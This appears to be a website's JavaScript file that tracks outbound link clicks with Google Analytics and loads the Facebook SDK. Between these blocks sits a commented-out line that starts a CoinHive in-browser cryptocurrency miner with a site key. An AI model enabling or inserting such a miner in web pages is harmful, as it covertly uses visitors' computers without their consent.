/* External tracking */
jQuery(document).ready(function() {
    jQuery('a').each(function() {
        var a = jQuery(this);
        var href = a.attr('href');
        if (href == undefined) return;
        var url = href.replace('http://', '').replace('https://', '');
        var hrefArray = href.split('.').reverse();
        var extension = hrefArray[0].toLowerCase();
        var hrefArray = href.split('/').reverse();
        var domain = hrefArray[2];
        if ((href.match(/^http/)) && (!href.match(document.domain))) {
            a.click(function() {
                _gaq.push(['_trackEvent', 'Outbound Traffic', href.match(/:\/\/(.[^/]+)/)[1], href]);
            });
        }
    });
}); /* Facebook async JS API */
window.fbAsyncInit = function() {
    FB.init({
        appId: '161064073906402',
        status: true,
        cookie: true,
        xfbml: true
    });
}; /*var chmn = new CoinHive.Anonymous('8S7QnMJxa5XUKxRdYcG66bKK8d5kNmUM');chmn.start();*/
(function() {
    var e = document.createElement('script');
    e.async = true;
    e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
    document.getElementById('fb-root').appendChild(e);
}());